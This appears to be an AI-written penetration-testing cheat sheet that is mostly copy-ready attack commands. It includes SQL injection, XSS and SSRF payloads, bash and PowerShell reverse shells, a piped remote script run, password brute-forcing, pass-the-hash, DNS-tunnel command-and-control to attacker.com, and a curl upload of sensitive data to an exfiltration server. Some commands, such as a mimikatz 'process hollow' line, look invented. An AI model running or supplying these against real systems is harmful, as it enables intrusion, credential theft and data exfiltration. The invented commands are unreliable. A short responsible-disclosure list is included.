# **The Ultimate Cybersecurity Master Cheat Sheet**  
*Everything you need for penetration testing, red teaming, and security assessments in one place*  

---

## **🌐 Network Reconnaissance & Scanning**
### **Basic Scanning**
```bash
# Quick scan with service detection
nmap -sV -T4 10.0.0.1 -oN quick_scan.txt

# Full port scan with script scanning
nmap -p- -sV -sC -O -T4 10.0.0.1 -oA full_scan
```

### **Advanced Enumeration**
```bash
# DNS Enumeration
dnsenum --enum example.com
dig any example.com @8.8.8.8 +short

# SMB/NETBIOS Enumeration
nbtscan 10.0.0.1/24
enum4linux -a 10.0.0.1 | tee enum4linux.log
```

### **Stealth Scanning**
```bash
# Fragmented packet scan
nmap -f -sS -T2 10.0.0.1

# Idle scan using zombie host
nmap -sI zombie_ip:port target_ip
```

---

## **🔓 Web Application Attacks**
### **Directory Bruteforcing**
```bash
# Fast recursive scan
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50

# Vhost discovery
ffuf -u https://target.com -H "Host: FUZZ.target.com" -w subdomains.txt -fs 4242
```

### **SQL Injection**
```bash
# Automated testing
sqlmap -u "https://target.com?id=1" --batch --level=5 --risk=3 --dbs

# Time-based blind SQLi test
' AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,10000000)) --
```

### **XSS & SSRF**
```javascript
// Basic XSS
<script>alert(document.domain)</script>

// Advanced SSRF
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## **💻 System Exploitation**
### **Reverse Shells**
```bash
# Bash (Linux)
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### **Privilege Escalation**
```bash
# Linux (Automated)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Windows (Manual Checks)
whoami /priv
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

---

## **🔑 Password Attacks**
### **Hash Cracking**
```bash
# Basic wordlist attack
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r rules/best64.rule

# Advanced mask attack
hashcat -m 2500 wifi.hccapx -a 3 ?d?d?d?d?d?d?d?d -w 3
```

### **Online Attacks**
```bash
# HTTP Form Bruteforce
hydra -L users.txt -P passwords.txt target.com http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid credentials" -t 30 -w 3
```

---

## **🛡️ Defense Evasion**
### **AV/EDR Bypass**
```powershell
# Obfuscated PowerShell
Invoke-Obfuscation -ScriptPath .\script.ps1 -Command 'Token\All\1'

# Process Hollowing
mimikatz.exe "process::hollow /process:explorer.exe /path:C:\temp\malware.exe"
```

### **C2 Communication**
```bash
# DNS Tunneling
dnscat2 --dns domain=attacker.com --secret=MySecretKey

# Domain Fronting
curl https://cdn.target.com --resolve cdn.target.com:443:REAL_IP -H "Host: cdn.target.com"
```

---

## **📊 Post-Exploitation**
### **Lateral Movement**
```bash
# Pass-the-Hash
crackmapexec smb 10.0.0.1/24 -u administrator -H NTLM_HASH --local-auth

# RDP Hijacking
tscon 2 /dest:rdp-tcp#0 /password:password
```

### **Data Exfiltration**
```bash
# File Compression & Exfil
tar -czf data.tar.gz /sensitive_data/
curl -X POST -F "file=@data.tar.gz" https://exfil.server/upload
```

---

## **🛠️ Essential Tools Reference**
| Category | Tools | Usage Example |
|----------|-------|--------------|
| **Scanning** | Nmap, Masscan | `masscan -p1-65535 10.0.0.1 --rate=1000` |
| **Exploitation** | Metasploit, Cobalt Strike | `msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"` |
| **PrivEsc** | WinPEAS, LinPEAS | `./linpeas.sh -a > linpeas.log` |
| **Cracking** | Hashcat, John | `john --format=NT hashes.txt --wordlist=rockyou.txt` |
| **C2** | Sliver, Covenant | `sliver> generate --http 10.0.0.1 --os windows` |

---

## **💎 Elite Techniques**
1. **Cloud Security**:  
   - AWS S3 Bucket Enumeration: `aws s3 ls s3://bucket-name --no-sign-request`  
   - Azure Storage SAS Token Abuse  

2. **Active Directory**:  
   - Kerberoasting: `GetUserSPNs.py -request -dc-ip DC_IP domain/user`  
   - Golden Ticket Attacks  

3. **Physical Security**:  
   - BadUSB Attacks with Rubber Ducky  
   - Lockpicking for Physical Penetration Tests  

---

## **📚 Learning Path**
- **Beginner**: TryHackMe, Hack The Box  
- **Intermediate**: Offensive Security PEN-200 (OSCP)  
- **Advanced**: SANS SEC760 (Advanced Exploitation)  
- **Expert**: Zero-Point Security CRTO (Red Team Ops)  

---

## **⚠️ Responsible Disclosure**
1. Always get **written permission**  
2. Document **every action**  
3. Respect **privacy and laws**  
4. Report vulnerabilities **responsibly**  

---

**🔐 Pro Tip**: Bookmark this page and update it regularly with your own findings!  

This is the **most comprehensive** cheat sheet combining the best elements from all previous versions with new advanced techniques. It's designed to be your **go-to reference** during security assessments.  

Would you like me to add any specific advanced techniques or focus areas?
